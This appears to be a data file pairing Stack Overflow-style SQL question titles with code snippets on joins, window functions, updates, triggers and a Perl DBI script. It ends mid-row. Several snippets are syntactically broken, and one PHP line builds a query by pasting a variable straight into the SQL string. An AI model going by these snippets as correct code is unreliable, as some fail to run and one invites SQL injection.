24633,35949,SQL Query help - Condition applies only for the Newest Record,"SELECT a.PatientId
FROM
    some_table AS a
    INNER JOIN (
        SELECT PatientId, MAX(Date) AS Date
        FROM some_table
        WHERE Test = 'X'
        GROUP BY PatientId
    ) AS lr ON a.PatientId = lr.PatientId AND a.Date = lr.Date
WHERE a.Test = 'X' AND a.Result > 10
"
5271,14214,How can I generate strings 'a'..'zzz' and then save them to the table?,"CREATE TABLE TEMP_CHARS (
    C CHAR PRIMARY KEY
);

INSERT INTO TEMP_CHARS VALUES('a'), ('b'), ('c'), ('d'), ('e'), ('f'), ('g'), ('h'), ('i'), ('j'), ('k'), ('l'), ('m'), ('n'), ('o'), ('p'), ('q'), ('r'), ('s'), ('t'), ('u'), ('v'), ('w'), ('x'), ('y'), ('z');

INSERT INTO YOUR_TABLE(YOUR_FIELD)
SELECT C
FROM TEMP_CHARS
UNION ALL
SELECT CONCAT(T1.C, T2.C) -- Generate all variations (with repetition) of length 2.
FROM TEMP_CHARS T1 CROSS JOIN TEMP_CHARS T2
UNION ALL
SELECT CONCAT(T1.C, T2.C, T3.C) -- Generate all variations (with repetition) of length 3.
FROM TEMP_CHARS T1 CROSS JOIN TEMP_CHARS T2 CROSS JOIN TEMP_CHARS T3;

DROP TABLE TEMP_CHARS;
"
24479,40495,Display zero by using count(*) if no result returned for a particular case,"CREATE TABLE #cities (edition_id INT, city VARCHAR(16))
INSERT INTO #cities VALUES(6, 'DELHI')
INSERT INTO #cities VALUES(50, 'AHMEDABAD')
INSERT INTO #cities VALUES(4, 'HYDERABAD')
INSERT INTO #cities VALUES(25, 'KOLKATA')
INSERT INTO #cities VALUES(51, 'BANGALORE')
INSERT INTO #cities VALUES(5, 'MUMBAI')
INSERT INTO #cities VALUES(24, 'CHENNAI')

select 
    c.city 'City', 
    ISNULL(t.Total, 0) 'Total'
from 
    #cities c
    LEFT JOIN (
        SELECT 
            edition_id, count(*) as Total 
        #tmptab1 
        GROUP BY edition_id
    ) AS t
    ON c.edition_id = t.edition_id

drop table #tmptab1
drop table #cities
"
17985,32653,unique wildcard update SQL syntax,"update tbl_Address
set ReceiverPostalCode = right(concat('00', ReceiverPostalCode ), 5) 
where len(ReceiverPostalCode) between 3 and 4
"
38192,21290,Joining a table to itself in Oracle,"SELECT p1.product_no, p1.format_no, p1.format_code, p2.h_number
  FROM myproducts p1 INNER JOIN myproducts p2
    ON p1.product_no = p2.product_no
   AND p1.format_code <> p2.format_code
   AND p2.format_code = 'H'
 WHERE p1.format_code = 'O';
"
6537,71627,SQL select latest entry in the category among visible," select DATE, USER, REQUEST
 from
  (
    select DATE, USER, REQUEST, FLAGGED 
   row_number() over(partition by USER order by DATE desc) rn
    from USERDATA WHERE FLAGGED = 1  
  ) src
 where rn = 1
"
9866,73113,MalFormed MySQL query,"SELECT 
    pl.id, pl.latitude, pl.longitude, pl.userId, pl.time, pl.type, com.id as com_id, com.text, com.time as com_time,
    com_usr.name as com_name, com_usr.email as com_email, com_usr.picture as com_picture,
    usr.name as com_usr_name,
    usr.email as com_usr_email,
    usr.picture as com_usr_picture,
    usr.type as com_usr_type 
FROM aa_places as pl  
LEFT JOIN aa_comments as com ON ( pl.id = com.place_id )   
LEFT JOIN aa_users as com_usr ON  (com.user_id=com_usr.id)
LEFT JOIN aa_users as usr ON (pl.userId = usr.id)
"
24334,32522,Cross-Multiplying Queries,"select s.serial_no
from serial_number s 
    left join customer_machine c on s.serial_no = c.serial_no
where c.serial_no is null
"
4470,45140,select statement that selects distinct based on rownumber,"SELECT PREMIUMYEAR, LASTNAME, FIRSTNAME, BOOKING, CLAIMTYPE, DEPARTUREDATE, [PLAN], INCIDENT, RESERVEAMOUNT, FINALSTATUS, AGE, TOTAL
    FROM (SELECT PREMIUMYEAR, LASTNAME, FIRSTNAME, BOOKING, CLAIMTYPE, DEPARTUREDATE, [PLAN], INCIDENT, RESERVEAMOUNT, FINALSTATUS, AGE, TOTAL,
                 ROW_NUMBER() OVER(PARTITION BY BOOKING ORDER BY TOTAL DESC) AS RowNum
              FROM dbo.[table]) t
    WHERE t.RowNum = 1
"
27801,20822,How to replace percent (%) character,"UPDATE MPOLITICAS SET NOM_POLITICA =  REPLACE(NOM_POLITICA, '%' , ' PERCENT');
"
13827,8430,How to add static value when doing INSERT INTO with SELECT in a MySQL query?,"INSERT INTO db2.b (x,y,z) SELECT x,y,4 FROM db1.a
"
35377,74020,Call one Stored Procedure inside other Stored Procedure on different servers,"EXEC [RemoteServer].DatabaseName.ObjectOwnerName.StoredProcedureName
"
21582,6455,how to add columns data in sql server?,"SELECT SUM(Quantity) FROM table_name GROUP BY ProductCode 
"
37847,45483,SQL: Parsing an associative input string with three delimiters,"insert @table2 (id, value) 
select 
    id = (select f.value from fn_ParseDelimitedStrings(t.value, ':') f where f.RowId=1),
    value = v1.value
from @table1 t
outer apply
(
  select v.value
    from fn_ParseDelimitedStrings(
         (select f.value 
            from fn_ParseDelimitedStrings(t.value, ':') f 
           where f.RowId=2)
         , '~') v 
) v1
"
20313,13244,update table using select from one table records that doesnt' exist in another,"UPDATE TAB1
SET    USERNAME = (SELECT TOP 1 USERNAME
                   FROM   TABLE1 A
                   WHERE  USERNAME LIKE 'r%')
FROM   TABLE1 TAB1
WHERE  NOT EXISTS (SELECT 1
                   FROM   TABLE2 B
                   WHERE  B.MEMBERID = TAB1.MEMBERID)
       AND TAB1.UserName LIKE 'b%' 
"
27638,36354,Oracle - complex update,"update testb
    set b.batch = (select trunc((seqnum - 1) / 5)
                   from (select a.*, row_number() over (order by a.record_status desc) as seqnum
                         from testa
                        ) a
                   where a.id = testb.id and
                  )
    where exists (select 1 from testa a where a.id = testb.id);
"
30390,68962,Returning Unique Values in Acess database with several columns,"SELECT Child, MIN(Parent) AS Parent, postnummer FROM (
SELECT barn.förnamn+' '+barn.efternamn AS Child, målsman.förnamn+' '+målsman.efternamn AS Parent, Målsman.postnummer as postnummer
FROM barn INNER JOIN Målsman ON barn.Postnummer = Målsman.Postnummer
WHERE (((Målsman.postnummer) Like '*23*'))
) a
GROUP BY child, postnummer
"
27135,1372,SQL reduce work done in SELECT when only one row is needed for each foreign key,"select rt.id
from referencetable rt
where exists (select 1 from test t2 where t2.id = rt.id and t2.data < 160 and t2.data > 130);
"
12522,41600,Oracle SQL Developer - Unable to run queries using varchar field as identifier,"select * from content_definition where content_id = 'hhhh233';
"
29924,19874,Interbase SQL statement using MAX as filter?,"SELECT PM.GUID, PM.PID, PM.MISCID, PM.YEAR FROM PMASTER PM
    INNER JOIN SEL SL ON SL.LGID = PM.PID 
WHERE AND PM.YEAR IN
    (SELECT MAX(PMS.YEAR) FROM PMASTER PMS WHERE PMS.PID = PM.PID)
ORDER BY PM.PID, PM.YEAR
"
17864,5972,How do I average the difference between specific values in TSQL?,"WITH ChatWithRownum AS (
    SELECT ChatID, User, LogID, CreatedOn, ROW_NUMBER() OVER(ORDER BY ChatID, CreatedOn) AS rownum
    FROM ChatLog
)
SELECT First.ChatID, Second.User,
    AVG(DATEDIFF(seconds, First.CreatedOn, Second.CreatedOn)) AS AvgElapsedTime
FROM ChatWithRownum First
    JOIN ChatWithRownum Second ON First.ChatID = Second.ChatID
        AND First.rownum = Second.rownum - 1
WHERE First.User != Second.User
GROUP BY First.ChatID, Second.User
"
14605,51600,Dynamically Alter column datatype from nvarchar to decimal if a condition is satisfied sql,"SELECT 'ALTER TABLE tb1 ALTER COLUMN [' + name + '] Decimal(18,2) NULL'
FROM sys.columns
WHERE [object_id] = OBJECT_ID('tb1')
AND name LIKE 'ROE%'
"
28913,6057,SQL left join with filter not using the filter,"create table test5 as 
select * from test3 left join test4 on test3.id = test4.id 

WHERE test3.id<> 2 and test4.id <> 2;
"
12292,14835,SQL Count between dates,"SELECT  D.Fulldate,
        ISNULL(COUNT(*),0) AS NumberofCars
FROM DimDate D
LEFT JOIN CarHires C
  ON D.Fulldate BETWEEN C.Startdate AND C.Enddate
GROUP BY D.Fulldate
ORDER BY D.Fulldate;
"
524,74664,Updating multiple rows with a composite key in MySQL,"UPDATE myTable
  SET newValue = CASE
    WHEN id=1 AND x=1 AND y=1 THEN 'val1'
    WHEN id=1 AND x=1 AND y=2 THEN 'val2'
    WHEN id=1 AND x=1 AND y=3 THEN 'val3'
    END
WHERE id IN (1,2,3)
"
15502,18732,GET min over multiple columns,"SELECT LEAST(MIN(col1), MIN(col2), MIN(col3)) AS minium_of_three_columns
FROM   my_table
"
34055,68722,Column names in each table must be unique. while copy table data from one table to another in sql server,"select k.transactid, k.Hbarcode into Khanger2013
 from KHanger_tbl k
inner join Transaction_tbl t
on t.transactid=k.transactid
where t.dtime <='2013-12-30
"
17955,65257,"simple sql query, combine results and divide","select (a.count_one / b.count_two) * 100 as final_count from 
(select field_one, count(*) as count_one from table1 group by field_one) a,
(select field_two, count(*) as count_two from table2 group by field_two) b
where a.field_one = b.field_two
"
25988,18195,Comparing Primary Key Constraints Between Databases,"SELECT DISTINCT
    QUOTENAME(t1.CONSTRAINT_CATALOG) + '.' + QUOTENAME(t1.CONSTRAINT_SCHEMA) + '.' + QUOTENAME(t1.CONSTRAINT_NAME) [Source],
    QUOTENAME(t2.CONSTRAINT_CATALOG) + '.' + QUOTENAME(t2.CONSTRAINT_SCHEMA) + '.' + QUOTENAME(t2.CONSTRAINT_NAME) [Target],
    CASE WHEN t1.CONSTRAINT_NAME  IS NULL OR t2.CONSTRAINT_NAME IS NULL THEN 'DISCREPANCY'
         WHEN t1.CONSTRAINT_NAME <> t2.CONSTRAINT_NAME THEN 'NAME MISMATCH'
         ELSE 'COMPLETE MATCH' END [Status]
FROM (
    SELECT c.* 
    FROM msdb.INFORMATION_SCHEMA.TABLE_CONSTRAINTS PK
    JOIN msdb.INFORMATION_SCHEMA.KEY_COLUMN_USAGE C
      ON C.TABLE_NAME = PK.TABLE_NAME
     AND C.CONSTRAINT_NAME = PK.CONSTRAINT_NAME
    WHERE PK.CONSTRAINT_TYPE = 'PRIMARY KEY'
) t1
FULL JOIN (
    SELECT c.* 
    FROM msdb.INFORMATION_SCHEMA.TABLE_CONSTRAINTS PK
    JOIN msdb.INFORMATION_SCHEMA.KEY_COLUMN_USAGE C
      ON C.TABLE_NAME = PK.TABLE_NAME
     AND C.CONSTRAINT_NAME = PK.CONSTRAINT_NAME
    WHERE PK.CONSTRAINT_TYPE = 'PRIMARY KEY'
) t2 ON t2.TABLE_NAME = t1.TABLE_NAME
    AND t2.COLUMN_NAME = t1.COLUMN_NAME
"
37420,69470,"Update more than one field in a table, having one field depending on the other","UPDATE tblOperation 
    SET  
    tblOperation.DateDifference = DateDiff(""d"",[tblOperation].[Date],[tblOperation].[FinalDate]), 
    tblOperation.Tax = tblOperation.Value*tblOperation.Percentage/3000*(DateDiff(""d"",[tblOperation].[Date],[tblOperation].[FinalDate])), 
    tblOperation.FinalValue = tblOperation.Value-(tblOperation.Value*tblOperation.Percentage/3000*(DateDiff(""d"",[tblOperation].[Date],[tblOperation].[FinalDate])));
"
22819,7131,Check if a list of items already exists in a SQL database,"Select GroupId
 From (
  Select GroupId
       , count(*) as GroupMemberCount
       , Sum(case when MyUserIDList.UserID is null then 0 else 1 End) as  GroupMemberCountInMyList
  from GroupUser 
     left outer join MyUserIDList on GroupUser.UserID=MyUserIDList.UserID
 group by GroupId
 ) As MySubQuery 
Where GroupMemberCount=GroupMemberCountInMyList
"
28737,44323,Spooling in Oracle adds spaces to columns... how can I avoid it?,"set colsep ""|""

with demo as
   ( select 'Various' as col1, 'test' as col2, 'examples' as col3 from dual
     union all select 'How', 'are', 'you' from dual )
select col1, col2, col3
from   demo;

COL1   |COL2|COL3
-------|----|--------
Various|test|examples
How    |are |you
"
33040,63355,Using built-in SQL functions with SequelizeJS,"options = {};
options.attributes = ['id', sequelize.literal('(NOW() - timestamp) as recordAge')];
MyTable.find(options).success(success);
"
11647,63126,Need an efficient query in the following case,"SELECT distinct A.id, B.id, c.timestamp, c.value FROM 
(
SELECT  c.value,  MAX(c.timestamp) AS max_timestamp FROM c
WHERE NOT c.value IS NULL
GROUP BY  c.value) c1 INNER JOIN c ON c1.value = c.value AND c1.max_timestamp = c.timestamp
    inner join b ON B.id = C.B_id
    inner join a ON A.id = B.A_id
"
20605,418,MySQL Query to Pull Distinct Id with Multiple WHEREs,"SELECT DETAILID
FROM
(
    select DETAILID, 1 as WhichMatch
    from tbl
    where NAME LIKE '%a%'
    UNION ALL
    select DETAILID, 2 as WhichMatch
    from tbl
    where NAME LIKE '%b%'
    UNION ALL
    select DETAILID, 3 as WhichMatch
    from tbl
    where NAME LIKE '%c%'
) SQ
GROUP BY DETAILID
HAVING COUNT(DISTINCT WhichMatch) = 3
"
2826,56205,"SQL join, insert?","CREATE VIEW CompanyClients AS
SELECT {column list}
  FROM Clientemp T1
 INNER JOIN
     Cliente T2
         ON T1.{Key} = T2.{Key}
;
"
13738,12069,Making large SQL query efficicent,"SELECT name, metric_1, metric_2
FROM customer AS c
LEFT JOIN (SELECT customer_id, COUNT(*) AS metric_1
           FROM metric1 AS m
           INNER JOIN metric1_lineitem AS l ON m.id = l.metric1_id
           GROUP BY customer_id) m1
ON m1.customer_id = c.customer_id
LEFT JOIN (SELECT customer_id, COUNT(*) AS metric_2
           FROM metric2 AS m
           INNER JOIN metric2_lineitem AS l ON m.id = l.metric2_id
           GROUP BY customer_id) m1
ON m2.customer_id = c.customer_id
ORDER BY metric_1 DESC
LIMIT 5
"
29530,67079,SQL: finding double entries without losing the ID,"SELECT min(ID), Product, Color FROM table GROUP BY Product, Color;
"
13200,22990,"After Table Joining, need specific row value based on another Row with same ID","SELECT     t.ID, machine.InitialValue
FROM       table1 t 
INNER JOIN table2 machine 
        ON t.ID = machine.ParentId
       AND machine.Name = 'MachineName'
INNER JOIN table2 active 
        ON t.ID = active.ParentId
       AND active.Name = 'Active'
       AND active.InitialValue = 1;
"
984,757,SQL - can you select everything where a certain string ends with a few characters?,"SELECT * 
  FROM t1
 WHERE substring(attribute, -1)= 'A'
       OR substring(attribute, -1)= 'B';
"
35026,11770,Cross Join MySQL Query with Counts,"select t1.term as term1, t2.term as term2,
       count(distinct t1.usr_id) as num_users
from table t1 join
     table t2
     on t1.usr_id = t2.usr_id and t1.term <> t2.term
group by t1.term, t2.term;
"
37911,10807,Confusion while using NOT IN clause in Postgres,"SELECT id
FROM flx2.groups
WHERE id NOT IN (SELECT groupid 
                 FROM flx2.lmsprovidergroups
                 WHERE groupid is not null)
"
26423,62459,SQL - SUM different rows,"SELECT count_mt14, sum_mt14
FROM (SELECT count(cmd.mt14) count_mt14, sum(mt14) sum_mt14, Liebelle_20_1 
      FROM g_Piece group by liebelle_20_1) cmd
LEFT JOIN g_individu ind
   ON ind.refindividu = cmd.LIBELLE_20_1
LEFT JOIN g_piece lot
   ON lot.GPIREFNOTAIRE = cmd.refpiece
  AND lot.gpirole = 'B2029005'
"
1731,16559,searching array of words faster,"    $query = ""SELECT count(word) FROM `news_google_split`  WHERE MATCH(`word`) AGAINST   
('$textPerson')   AND  `date` >= '$dateBegin' AND `date` <= '$dateEnd'""; 
"
1677,19041,SQL Query to show opposite values,"SELECT A.node_name, 
       B.status 
FROM   (SELECT DISTINCT node_name 
        FROM   yourtable) A 
       CROSS JOIN (SELECT DISTINCT status 
                   FROM   yourtable) B 
       LEFT OUTER JOIN yourtable C 
                    ON A.node_name = C.node_name 
                       AND C.status = B.status 
WHERE  C.status IS NULL 
"
39343,1268,Select from 2 tables by repeating the rows from the second to each row in the first,"SELECT B.BookId, R.RentedBy, BR.RentalDate
FROM Books AS B
CROSS JOIN (SELECT DISTINCT RentedBy FROM BookRentals) AS R
LEFT JOIN BookRentals AS BR ON BR.BookId = B.BookId AND BR.RentedBy = R.RentedBy
"
20201,15574,SQL Server Exception Reporting Script,"SELECT FILE_NAME, ISNULL([Collection],0) AS [Collection], ISNULL([Image],0) AS [Image],  
ISNULL([Log],0) AS [Log],  ISNULL([Sent to warehouse],0) AS [Sent to warehouse], Region
FROM (  
    SELECT FILE_NAME, Document_Type, COUNT(Document_Type) AS Frequency, Region 
    FROM documents d,doctype dt WHERE d.DoctypeID = dt.DoctypeID 
    GROUP BY Document_Type, FILE_NAME,REGION
) AS s
PIVOT
(
    SUM(Frequency)
    FOR [Document_Type] IN ([Collection], [Image], [Log], [Sent to warehouse])
)AS pvt
"
19161,58653,"Postgresql: Update column1 with ascending values, depending on column2 sort order","update the_table
  set ""order"" = t.rn
from (
   select id, 
          row_number() over (order by name) as rn
   from the_table
) t where t.id = the_table.id;
"
9339,1344,Using output of function from select in where clause,"Select ID, Count(ID) As Count_ID
From Table1
Group By ID
HAVING Count(ID) = 3;
"
15376,30276,Delete SQL Query,"UPDATE table_name SET
column_name = null
WHERE another_column_name = 'some value'
"
30794,19575,SSAS -> MDX -> How to create a query that returns a topcount by a date period i.e. week?,"SELECT NON EMPTY { [Measures].[Revenue] } ON COLUMNS, 
NON EMPTY 
{
[Date Link].[Week].[Week].ALLMEMBERS *
{
TopCount ( { ([Customer].[Customer Id].[Customer Id].ALLMEMBERS * [Customer].[Name].[Name].ALLMEMBERS ) }, 100, [Measures].[Revenue])  
}
}
ON ROWS 
FROM [DW]
"
37409,20936,Oracle SQL group data by value,"select id, 
    max(case when attr_name = 'XPTA' then attr_id end) xpta,
    max(case when attr_name = 'XPTO' then attr_id end) xpto,
    start_date
from table_a 
group by id, start_date
"
8796,49035,Executing large query and returning rows in Oracle,"CREATE TABLE multi_tab (num NUMBER, 
                        dat1 DATE, 
                        var VARCHAR2(24), 
                        dat2 DATE) 

declare
  c       NUMBER;
  d       NUMBER;
  n_tab  DBMS_SQL.NUMBER_TABLE;
  d_tab1 DBMS_SQL.DATE_TABLE;
  v_tab  DBMS_SQL.VARCHAR2_TABLE;
  d_tab2 DBMS_SQL.DATE_TABLE;
  indx NUMBER := 10;
BEGIN

  c := DBMS_SQL.OPEN_CURSOR;
  DBMS_SQL.PARSE(c, 'select * from multi_tab order by 1', DBMS_SQL.NATIVE);

  DBMS_SQL.DEFINE_ARRAY(c, 1, n_tab,  5, indx);
  DBMS_SQL.DEFINE_ARRAY(c, 2, d_tab1, 5, indx);
  DBMS_SQL.DEFINE_ARRAY(c, 3, v_tab,  5, indx);
  DBMS_SQL.DEFINE_ARRAY(c, 4, d_tab2, 5, indx);

  d := DBMS_SQL.EXECUTE(c);

  loop
    d := DBMS_SQL.FETCH_ROWS(c);

    DBMS_SQL.COLUMN_VALUE(c, 1, n_tab);
    DBMS_SQL.COLUMN_VALUE(c, 2, d_tab1);
    DBMS_SQL.COLUMN_VALUE(c, 3, v_tab);
    DBMS_SQL.COLUMN_VALUE(c, 4, d_tab2);

    EXIT WHEN d != 5;
  END LOOP;

  DBMS_SQL.CLOSE_CURSOR(c);
"
38227,65070,How to count distinct column in SQL Server,"select count(distinct sq.barang)
from
(
select  barang as barang
        ,COUNT(*) as jumlah
from    tbltes  
group by 
        barang 
) sq
where cast(sq.jumlah as float)/6 > 0.2
"
17785,3318,Added date and modified date for Oracle table audit,"SQL> create table foo (hi varchar2(10), added_date date, modified_date date);

Table created.

SQL> create trigger foo_auifer
  2  before update or insert on foo
  3  for each row
  4  declare
  5  begin
  6    if (inserting) then
  7      :new.added_date := sysdate;
  8    elsif (updating) then
  9      :new.modified_date := sysdate;
 10    end if;
 11  end;
 12  /

Trigger created.

SQL> insert into foo (hi) values ('TEST');

1 row created.

SQL> insert into foo (hi) values ('TEST2');

1 row created.

SQL> update foo set hi = 'MODDED' where rownum  = 1;

1 row updated.

SQL> alter session set nls_date_format='dd-mon-yyyy hh24:mi:ss';

Session altered.

SQL> select * from foo;

HI         ADDED_DATE           MODIFIED_DATE
---------- -------------------- --------------------
MODDED     07-nov-2012 15:28:28 07-nov-2012 15:28:39
TEST2      07-nov-2012 15:28:30

SQL>
"
25827,27256,Fast SQL question about multiple month dates,"...
GROUP BY tblSupportCalls.System, Year([Date]), Month([Date]);
"
7829,46398,How do I display the query time when a query completes in Vertica?,"\timing 
"
9903,47651,How to do this simple MySQL statement without resorting to a sub query?,"SELECT user_id, avatar
FROM profile_views AS PV
     INNER JOIN users AS U ON U.user_id = PV.profile_user_id
WHERE PV.viewer_user_id = 1
"
15453,3026,Creating a new column using CASE and maybe count,"SELECT
    c.course_title
    ,COUNT(DISTINCT a.studentID) AS [Number of students that have taken the course]
    ,COUNT(DISTINCT a.classdetailID) AS [Number of Classes]
FROM
    studentcoursedetails a
    JOIN
    classdetails b ON b.classdetailID = a.classdetailID
    JOIN
    course c ON b.courseID = c.courseID
GROUP BY
    c.course_title
"
10218,38752,Select query with constant variable,"SELECT 
  T.KeyName,
  TT.ConstValues
FROM Tbl T
  CROSS JOIN
  (VALUES ('R1'), ('R2'), ('R3'), ('R4')) TT(ConstValues)
"
25350,34279,SQL update query using aggregate function and group by in where clause?,"update PropertyListing p
inner join
(
select
 max(ListingID) as ListingID,
 PropertyID
from
 PropertyListing
group by
 PropertyID
) latest on latest.ListingID = p.ListingID
set
 p.ListingEndDateTime = now();
"
25701,46598,Join album with its images count and cover?,"SELECT a.id, a.name, count(p1.id) AS imageCount, p2.image as cover
FROM albums a
LEFT JOIN photos p1 ON p1.album = a.id
LEFT JOIN photos p2 ON p2.id = a.cover
GROUP BY a.id
"
35449,63646,ORACLE SQL Query with Parent and Child structure,"SQL> WITH myData AS (
  2    SELECT 3780952 Customer_ID, 3780952 Account_ID, 3780952 Parent_Account_ID
  3      FROM DUAL
  4    UNION ALL SELECT 3780997, 3780997, 3780997 FROM DUAL
  5    UNION ALL SELECT 3781004, 3781004, 3780997 FROM DUAL
  6  )
  7  SELECT v.*,
  8         CASE WHEN ps = 'PS' AND customer_id = parent_account_id  THEN 'Y'
  9              WHEN ps = 'PS' THEN 'N'
 10         END ""Principle"",
 11         CASE WHEN ps = 'PS' AND customer_id != parent_account_id  THEN 'Y'
 12              WHEN ps = 'PS' THEN 'N'
 13         END ""Supp""
 14    FROM (SELECT m.*,
 15                 CASE WHEN customer_id = parent_account_id
 16                       AND COUNT(*) OVER (PARTITION BY parent_account_id) = 1
 17                      THEN 'NonPS'
 18                      ELSE 'PS'
 19                 END ps
 20            FROM myData m) v;

CUSTOMER_ID ACCOUNT_ID PARENT_ACCOUNT_ID PS    P S
----------- ---------- ----------------- ----- - -
    3780952    3780952           3780952 NonPS
    3781004    3781004           3780997 PS    N Y
    3780997    3780997           3780997 PS    Y N
"
33518,27702,How can you set a value in an update statement based on 2 parameters?,"UPDATE MyTable
SET FirstName = @FirstName,
    LastName = @LastName,
    JobNumber = CASE WHEN @MyMainParameter IS NOT NULL THEN COALESCE(@JobNumber, JobNumber) ELSE JobNumber END
WHERE ...
"
30712,53956,COUNT FUNCTION where clause,"SELECT COMPANY_NAME, ENROLLMENT_FEE, COUNT(COMPANY_NAME) AS NR_OF_MEMBER
FROM COMPANY
GROUP BY COMPANY_NAME, ENROLLMENT_FEE
ORDER BY NR_OF_MEMBER DESC
LIMIT 1;
"
913,35030,Sum of DateTime difference in sql (HH.MM),"SELECT
  ATM,
  CONVERT(VARCHAR(10), SUM(DATEDIFF(Minute, TicketRaisedOn, ClosedOn)) / 60)
  + '.' +
  RIGHT('00' + CONVERT(VARCHAR(2), SUM(DATEDIFF(Minute, TicketRaisedOn, ClosedOn)) % 60), 2)
FROM Ticket
GROUP BY ATM
"
2234,47181,How to add missing values in a table based on other table,"SELECT DISTINCT Table_2.Client, Table_1.Category INTO Table_3
FROM Table_1, Table_2;
"
15507,18251,SQL Query to compare two most recently modified row of the same table,"select id, max(case when seqnum = 1 then value end) as value
from (select t.*, row_number() over (partition by id order by modifieddate desc) as seqnum
      from table t
     ) t
group by id
having max(case when seqnum = 1 then value end) <> max(case when seqnum = 2 then value end);
"
17606,59340,"Why does my Perl script die with an ""out of memory"" exception?","#!/usr/bin/perl  -w

use strict;
use warnings;
use DBI;
## -------------------------------------------------------------------------##

## -------------------------------------------------------------------------##
## SET GLOBAL CONFIG #############
my $globalConfig = {
                _DIR => qq{../Data},
                _FILES => {
                    'cnai_all.csd'   => '_TEST'
                    }               
                };
## -------------------------------------------------------------------------##


## -------------------------------------------------------------------------##
my $sTime = time();

my $sepChar = "" "";
my $csv_dbh = DBI->connect(""DBI:CSV:f_dir="".$globalConfig->{_DIR}."";"");

$csv_dbh->{csv_eol} =""\n"";
#$csv_dbh->{csv_quote_char} =""'"";
#$csv_dbh->{csv_escape_char} =""\\"";
$csv_dbh->{csv_null} = 1;
$csv_dbh->{csv_quote_char} = '""';
$csv_dbh->{csv_escape_char} = '""';
$csv_dbh->{csv_sep_char} = ""$sepChar"";
$csv_dbh->{csv_always_quote} = 0;
$csv_dbh->{csv_quote_space} = 0;
$csv_dbh->{csv_binary} = 0;
$csv_dbh->{csv_keep_meta_info} = 0;
$csv_dbh->{csv_allow_loose_quotes} = 0;
$csv_dbh->{csv_allow_loose_escapes} = 0;
$csv_dbh->{csv_allow_whitespace} = 0;
$csv_dbh->{csv_blank_is_undef} = 0;
$csv_dbh->{csv_empty_is_undef} = 0;
$csv_dbh->{csv_verbatim} = 0;
$csv_dbh->{csv_auto_diag} = 0;


my @list = $csv_dbh->func('list_tables');
my $sth = $csv_dbh->prepare(""SELECT CELL,NW,BSC,n_cell_0 FROM cnai_all.tmp"");


#print join (""\n"",@list);

print ""\n-------------------\n"";

$sth->execute();
while (my $row = $sth->fetchrow_hashref) {
    # just print a hash refrence
    print ""$row\n"";
}
$sth->finish();

print ""\n finish after "".(time()-$sTime)."" sec "";

"
26074,75367,Insert trigger will not work properly,"CREATE TRIGGER triggerupdate ON PoleUnits 
FOR INSERT, UPDATE AS 
  update PoleUnits
  set LEADRT = STUFF (PoleUnits.LEADRT, 1, 0,'L-')
  from PoleUnits 
    inner join inserted  -- this is basically a self join
      on PoleUnits.ID = inserted.ID
  where PoleUnits.LEADRT not like '%L-%'
"
35166,18404,"In Oracle SQL , how do I show a 0 as a result even for rows where it doesn't return any values?","WITH mytable AS (SELECT   1 AS id,
                          'Jackson, MS' AS city,
                          2 AS Num,
                          'Y' AS approved_flag
                   FROM   DUAL
                 UNION ALL
                 SELECT   2,
                          'Libery Lake, WA',
                          27,
                          'Y'
                   FROM   DUAL
                 UNION ALL
                 SELECT   3,
                          'Oconee, SC',
                          89,
                          'N'
                   FROM   DUAL)
SELECT   id, city, DECODE (approved_flag, 'N', 0, Num) AS Num
  FROM   mytable
"
28745,26205,If else statement mysql,"SELECT …
FROM Town
LEFT JOIN Department ON Department.id = Town.department
LEFT JOIN Region ON Region.id = COALESCE(Town.region, Department.region)
LEFT JOIN Country ON Country.id = COALESCE(Town.country, Region.country)
"
7864,35899,Find duplicate row get only the older one,"SELECT id, jos_users.username, email, password, lastvisitDate
  FROM jos_users
 INNER JOIN (SELECT username
               FROM jos_users jb
              where jb.lastvisitDate =
                    (select min(jb1.lastvisitDate)
                       from jos_users jb1
                      where jb1.username = jb.username)
              GROUP BY username
             HAVING count(id) > 1) dup
    ON jos_users.username = dup.username;
"
11340,32517,MySQL not properly matching email addresses using = but works with LIKE,"UPDATE mytable SET email_varchar = TRIM(TRAILING '\r' FROM email_varchar)
"
5949,72025,Using SQL Case in a UNION SELECT to combine two tables with no like fields,"select 'authors' as [type]
       , city,state
       from authors
union 
select 'publishers' as [type]
       , city,state
       from publishers
"
18360,323,search for column names in oracle,"select COLUMN_NAME from ALL_TAB_COLUMNS 
  where TABLE_NAME='mytable' and COLUMN_NAME like '%ID%';
"
16351,18486,Sum and compare columns from different tables and databases,"select *
from
(select col1, SUM(col2)
from table1
group by col1) t1 INNER JOIN
(select col1, col2
from table2) t2 ON t1.col1 = t2.col1 where t1.col2 <> t2.col2
"
1769,55697,MYSQL - Inner join with select statement to fetch Sum,"SELECT
ui.email,
ui.userid,
SUM(ep.earnPoints),
ep.add_date
from earn_points as ep 
INNER JOIN user_info as ui on ep.userid = ui.userid 
where DATE(rc.add_date) = '2012-03-22' Group By ui.email,ui.userid,ep.add_date;
"
37655,41045,Select most frequent,"with allnums as (
        select id, 1 as col, num1 as num from t union all
        select id, 2 as col, num2 as num from t union all
        select id, 3 as col, num3 as num from t union all
        select id, 4 as col, num4 as num from t union all
        ...
    )
select top x an1.num, an2.num, count(*)
from allnums an1 join
     allnums an2
     on an1.id = an2.id and
        an1.col < an2.col
order by count(*) desc
"
1008,57115,find time conflicts between two dates,"DECLARE @date1 DATETIME = '2016-06-09 08:30:00.000';
DECLARE @date2 DATETIME = '2016-06-13 18:00:00.000';
DECLARE @lunchStart DATETIME = '2016-06-13 14:00:00.000';
DECLARE @lunchEnd DATETIME = '2016-06-13 15:30:00.000';
DECLARE @output INT = 0;

SELECT @output = DATEDIFF(DAY, @date1, @date2)
IF DATEPART(HOUR, @date1) > DATEPART(HOUR, @lunchStart) OR (DATEPART(HOUR, @date1) = DATEPART(HOUR, @lunchStart) AND DATEPART(MINUTE, @date1) <= DATEPART(MINUTE, @lunchStart))
    SET @output = @output - 1

IF DATEPART(HOUR, @date2) < DATEPART(HOUR, @lunchEnd) OR (DATEPART(HOUR, @date2) = DATEPART(HOUR, @lunchEnd) AND DATEPART(MINUTE, @date2) = DATEPART(MINUTE, @lunchEnd))
    SET @output = @output - 1

PRINT @output
"
9900,68213,SQL Constraint IGNORE_DUP_KEY on Update,"create table #t (col1 int not null, col2 int not null, primary key (col1, col2))

insert into #t 
select 1, 1 union all 
select 1, 2 union all 
select 2, 3

-- you want to do just this...
update #t set col2 = 1

-- ... but you really need to do this
update #t set col2 = 1
where not exists (
    select * from #t t2
    where #t.col1 = t2.col1 and col2 = 1
    )
"
2648,73308,Keeping only the N most recent records around for a table?,"Add a counter to each message.
When there's a new message:
